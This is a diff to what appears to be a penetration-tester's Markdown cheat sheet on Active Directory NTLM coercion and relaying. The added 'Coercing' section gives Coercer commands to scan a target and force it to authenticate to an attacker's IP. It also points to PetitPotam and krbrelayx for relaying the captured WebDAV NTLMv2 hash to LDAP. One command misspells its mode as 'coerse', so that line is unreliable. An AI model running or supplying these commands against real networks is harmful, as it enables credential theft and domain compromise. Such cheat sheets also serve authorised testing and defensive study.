@@ -5,7 +5,7 @@
   * [Active Directory-Integrated DNS (ADIDNS)](#Active-Directory-Integrated-DNS)
   * [Mitm6](#Mitm6)
   * [Files](#Files)
-  * [Force-authentication](#Force-authentication)
+* [Coercing](#Coercing)
 * [Relaying](#Relaying)
   * [SMB relaying](#SMB-relaying)
   * [LDAP Relaying](#LDAP-Relaying)
@@ -223,8 +223,20 @@ IconIndex=1
 
 #### For other filetypes check out the tools listed
 
-### Force authentication
-#### Trigger target computer to authenticate to attacker machine
+## Coercing
+- https://github.com/p0dalirius/Coercer
+
+#### Check which coercer methods are available
+```
+python3 Coercer.py scan -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
+```
+
+#### Force auth to attacker IP
+```
+python3 Coercer.py coerse -L <ATTACKER IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
+```
+
+#### WEBDAV auth
 - https://github.com/topotam/PetitPotam
 - https://github.com/dirkjanm/krbrelayx
 - Creates a ```[WebDAV] NTLMv2 Hash``` in responder, ```HTTPD: received``` in ntlmrelayx. Can be used against relaying to ldap, ldaps.
